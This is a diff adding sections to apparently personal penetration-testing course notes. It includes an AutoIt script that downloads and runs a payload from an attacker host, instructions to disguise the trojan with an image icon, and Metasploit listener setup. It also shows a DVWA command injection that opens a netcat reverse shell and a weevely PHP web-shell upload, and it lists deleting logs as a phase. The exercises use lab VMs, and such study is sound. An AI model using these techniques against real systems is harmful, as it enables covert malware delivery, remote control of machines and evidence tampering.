@@ -8,6 +8,55 @@ sudo msfvenom -p windows/meterpreter/reverse_tcp --platform windows -f exe LHOST
 ```
 - If you wanted to use this on an external network you would add an external IP (public IP) and then setup port forwarding. in your router. 
 
+Chat GPT or Bito (VSCode) code to download and execute a file:
+```C
+#include <StaticConstants.au3>
+#include <WindowsConstants.au3>
+
+Local $urls = "url1,url2"
+
+Local $urlsArray = StringSplit($urls, ",", 2)
+
+For $url in $urlsArray
+	$sFile = _DownloadFile($url)
+	shellExecute($sFile)
+
+Next
+
+Func _DownloadFile($sURL)
+	Local $hDownload, $sFile
+	$sFile = StringRegExpReplace($sURL, "^.*/", "")
+	$sDirectory = @TempDir & $sFile
+	$hDownload = InetGet($sURL, $sDirectory, 17, 1)
+	InetClose($hDownload)
+	Return $sDirectory
+EndFunc    ;==>_GetURLImage
+```
+- Name the file `autoit-file.txt`. When completed give it the extension `.au3`
+- Add the URL as: `http://<attacker-ip>/payloads/image.jpg` and `http://<attacker-ip>/payloads/payload.exe`. Copy and paste the files path into the kali browser to make sure you have entered the correct path to file.
+- Keep the Trojan and AutoIt file in the same location
+- You can now use a tool, that was installed with Veil, to change the AutoIt file into an exe file. The tool is called: `Compile Script to .exe`
+
+![](img/autoit-to-exe.png)
+
+_AutoIt is a freeware programming language for Microsoft Windows. In its earliest release, it was primarily intended to create automation scripts for Microsoft Windows._
+
+Add an icon to the file using an online website. Add the AutoIt file as the source. Compile for system x64 by ticking the box. Make the icon out of the same JPEG image that we used for the script, that way when it opens it just shows the same image as the icon. 
+
+Open msfconsole and start a listener:
+
+```sh
+msfconsole
+```
+
+```sh
+use exploit/multi/handler/reverse_tcp
+```
+
+Set Options and exploit to start the listener.
+
+We can then test this by downloading the new file from our Windows VM. When the file is ran you'll receive a meterpreter session. 
+
 ---
 
 **File control in meterpreter**
@@ -111,6 +160,132 @@ It could take a few minutes for it to work. There is a way to hide our malicious
 ---
 
 **Ethical Hacker's Blueprint - Road to Success**
+
+Six Phases: 
+1. Reconnaissance
+2. Scanning
+3. Identifying Vulnerabilities
+4. Gaining Access
+5. Maintaining Access
+6. Reporting
+
+Reconnaissance:
+1. Gathering Information Passively
+2. Open Source Research
+
+Scanning:
+1. Active Information Gathering (nmap, nesus, netdiscover)
+
+Identifying Vulnerabilities:
+1. Analyse Scan Results and Search for Possible Vulnerabilities
+2. Search Within Vulnerability Databases 
+3. Attention to Details, OS Versions, Fixes, Patches, Open Ports etc
+
+Gaining Access:
+1. Gaining Access Using Previously Identified Vulnerabilities
+2. Metasploit
+3. Opening Sessions
+
+Maintaining Access:
+1. Sustaining the Session
+2. Persistence
+3. Migration (migrate processes)
+
+Reporting:
+1. Deleting Logs
+2. Preparing Reports
+3. Presenting Reports
+ ---
+
+**Advanced Information Gathering**
+
+Tools: netcraft https://www.netcraft.com/
+
+Netcraft will scan website URLs and provide a report. Enter the URL where it asks **What's that site running?** 
+
+Provides the following information:
+- Background
+- Network
+- IP details
+- IP geolocation
+- SSL/TLS
+- And more useful information
+
+Website crawlers:
+dirb
+gobuster
+
+```sh
+dirb <URL>
+```
+
+_These tools are covered in other sections of this obsidan file._
+
+---
+
+**Remote Code Execution (RCE)**
+
+We can use the metasploitable VM to test this in the DVWA website. Here, under command execution, it allows the user to use the ping command. If we add a `;` after entering a ping command the bash shell will do another command of our choice.
+For example:
+```sh
+google.com; ls
+```
+
+You can see that it executes both commands. You could easily get the system to execute a reverse shell, or search for sensitive files etc.
+
+Start netcat on the Kali machine
+```sh
+nc -l -p 4444
+```
+
+On the DVWA site
+```sh 
+google.com; nc -e /bin/bash <attacker-ip> -p 4444
+```
+- e - Executes a shell (can also use sh)
+
+Gather some basic info:
+```sh
+whoami
+id
+uname -a
+```
+
+**Upload Vulnerability**
+
+You can upload a reverse shell. You can then navigate to the file which will execute the code. You need to have your listener ready to catch the shell.
+
+I like to use PentesterMonkey Reverse PHP shell located in Kali > exploits > PHP. Here is some of his other shells: https://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet
+
+We can also use tools like weevely:
+```sh
+sudo weevely generate 12345 /shell.php
+```
+- 12345 - Attacker defined password
+- /shell.php - Desired file location (would be put into the root directory)
+
+The DVWA site gives you the exact location of where it stored our file but in a real website you would have to discover it yourself. You could look up what the site is running and then look online for possible default locations of stored upload files, for example.
+
+You might get a blank screen but as long as it's not a `404` page should be okay. It just means that the website doesn't show anything for your PHP file.
+
+Once you have the file location you can interact with it, again, using weevely.
+```sh
+weevely http://<website-url>/dvwa/hackable/uploads/shell.php 12345
+```
+
+You should get back a weevely shell. Type help to see a list of commands. You can also use standard Linux commands.
+
+**File Inclusion Vulnerability**
+
+
+
+
+
+
+
+
+
+
 
 
 
